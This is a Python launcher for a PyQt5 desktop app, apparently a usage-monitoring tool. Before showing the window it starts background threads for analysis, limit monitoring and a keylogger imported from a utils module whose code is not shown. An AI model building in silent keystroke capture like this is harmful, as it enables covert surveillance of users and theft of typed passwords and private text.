import sys
import threading
from PyQt5.QtWidgets import QApplication
from gui.main_window import MainWindow  # QTabWidget içeren, sekmeli yapı
from utils.style import apply_stylesheet
from main import run_analysis
from utils.keylogger import start_keylogger
from utils.limits import start_limit_monitoring


def start_background_tasks():
    threading.Thread(target=run_analysis, daemon=True).start()
    threading.Thread(target=start_limit_monitoring, daemon=True).start()
    threading.Thread(target=start_keylogger, daemon=True).start()


if __name__ == "__main__":
    start_background_tasks()

    app = QApplication(sys.argv)
    apply_stylesheet(app, "style.qss")

    window = MainWindow()
    window.show()

    sys.exit(app.exec_())
